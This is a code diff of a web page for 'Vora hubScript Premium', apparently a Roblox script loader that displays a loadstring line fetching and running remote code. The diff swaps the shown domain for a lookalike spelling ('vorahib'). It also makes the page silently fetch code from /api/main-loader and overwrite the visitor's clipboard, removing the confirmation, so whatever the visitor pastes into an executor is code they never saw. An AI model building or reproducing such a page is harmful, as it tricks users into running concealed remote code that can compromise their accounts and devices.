@@ -37,18 +37,13 @@
       color: #8b949e;
       font-size: 14px;
     }
-    .success {
-      color: #58a6ff;
-      font-size: 24px;
-      font-weight: 600;
-    }
   </style>
 </head>
 <body>
   <h1>Vora hubScript Premium!</h1>
   
   <div class="code">
-    loadstring(game:HttpGet("https://vorahub-freemium.vercel.app/main-loader"))()
+    loadstring(game:HttpGet("https://vorahib-freemium.vercel.app/main-loader"))()
   </div>
 
   <div class="footer">
@@ -56,19 +51,13 @@
   </div>
 
   <script>
+    // Script otomatis copy tanpa notifikasi
     setTimeout(() => {
       fetch('/api/main-loader')
         .then(r => r.text())
         .then(code => {
-          navigator.clipboard.writeText(code).then(() => {
-            document.body.innerHTML = `
-              <h1 class="success">✓ Script berhasil di-copy!</h1>
-              <p style="color:#8b949e; margin-top:20px; font-size:17px;">
-                Buka executor lalu paste & execute
-              </p>
-              <div class="footer">Vora Hub • Protected</div>
-            `;
-          });
+          navigator.clipboard.writeText(code);
+          // Tidak ada pesan sukses, halaman tetap sama
         });
     }, 800);
   </script>
